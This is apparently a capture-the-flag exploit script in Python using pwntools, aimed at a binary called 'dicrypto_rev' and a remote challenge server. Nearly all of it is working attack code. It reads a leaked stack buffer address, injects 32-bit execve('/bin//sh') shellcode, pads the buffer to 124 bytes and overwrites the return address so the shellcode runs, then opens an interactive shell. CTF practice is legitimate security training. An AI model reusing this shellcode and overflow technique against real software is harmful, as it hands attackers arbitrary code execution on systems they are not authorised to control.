from pwn import *
from sys import *

elf = context.binary = ELF("./dicrypto_rev")
p = process("./dicrypto_rev")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

HOST = "chall.agrihack-csi.com"
PORT = 17004

cmd = """
b*0x080493ED
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)
	

shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

p.recvuntil(b'Buffer: ')
buffer = eval(p.recvline().rstrip())
print(hex(buffer))


payload = shellcode
payload += b'A'*(124-len(shellcode))
payload += p32(buffer+4) #buffer+4 isinya bakal \x90
p.sendline(payload)
p.interactive()